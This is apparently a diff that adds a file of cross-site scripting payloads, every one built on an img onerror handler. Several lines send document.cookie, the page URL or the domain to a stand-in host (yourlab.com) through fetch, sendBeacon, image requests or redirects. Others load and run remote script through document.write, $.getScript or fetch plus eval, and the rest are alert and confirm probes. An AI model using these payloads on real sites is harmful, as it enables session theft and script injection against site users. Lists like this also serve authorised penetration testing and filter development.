@@ -1,0 +1,23 @@
+payloADS
+
+
+<img src="X" onerror="alert('XSS1')"/>
+<img src=x onerror=alert('XSS2') //>
+<img src=x onerror=console.log('XSS3')>
+<img src=x:alert(alt) onerror=eval(src) alt="XSS4"/>
+<img src=x onerror=window.location='http://yourlab.com/?cookie='+document.cookie>
+<img src="X" onerror="fetch('http://yourlab.com/log?key='+document.domain)"/>
+<img src=# onerror="javascript:alert('XSS5')" />
+<img src=x:confirm(alt) onerror=eval(src) alt='XSS6'/>
+<img src=x onerror="this.src='http://yourlab.com/?'+document.cookie;alert('XSS7')" />
+<img src="X" onerror="new Image().src='http://yourlab.com/?'+document.location.href"/>
+<img src="X" onerror="document.write('<script src=http://yourlab.com/malicious.js></script>')"/>
+<img src=x onerror=confirm('XSS8') />
+<img src=x onerror="navigator.sendBeacon('http://yourlab.com/capture', document.cookie)"/>
+<img src="X" onerror="document.body.innerHTML='<iframe src=http://yourlab.com></iframe>'"/>
+<img src=x onerror="$.getScript('http://yourlab.com/malicious.js')"/> (Assuming jQuery is loaded)
+<img src="X" onerror="fetch('http://yourlab.com/log', { method: 'POST', body: JSON.stringify({cookie: document.cookie}) })"/>
+<img src=x onerror="document.getElementById('someId').innerHTML='<img src=x onerror=alert(9)>'"/>
+<img src=x onerror="fetch('http://yourlab.com/log').then(response => response.text()).then(data => eval(data))"/>
+<img src=x onerror="Function('alert(\'XSS9\')')()"/>
+<img src=x onerror="parent.postMessage(document.location.href,'*')"/>
